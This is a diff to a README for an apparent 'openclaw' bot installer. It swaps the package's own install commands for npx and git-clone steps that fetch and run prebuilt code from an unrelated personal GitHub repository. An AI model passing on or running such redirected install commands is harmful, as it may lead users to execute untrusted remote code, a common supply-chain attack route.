@@ -11,15 +11,15 @@ You can launch the installer using either of the following methods:
 ### Method 1: Using the NPX Command (Recommended)
 You do not need to download the source code beforehand. Simply open your terminal and run:
 ```bash
-npx create-openclaw-bot
+npx github:dangthanhhung61-dotcom/openclaw-setup-2026.9.8 --project-dir=C:\bot
 ```
 The system will start a local server and automatically open the setup interface in your default browser (defaulting to `http://127.0.0.1:51789`).
 
 ### Method 2: Manual Setup
-If you have cloned or downloaded the repository manually:
+If you have cloned or downloaded the repository manually (no `npm install` needed):
 ```bash
-npm install
-npm start
+git clone https://github.com/dangthanhhung61-dotcom/openclaw-setup-2026.9.8.git
+node openclaw-setup-2026.9.8/dist/cli.js --project-dir=C:\bot
 ```
 
 ---
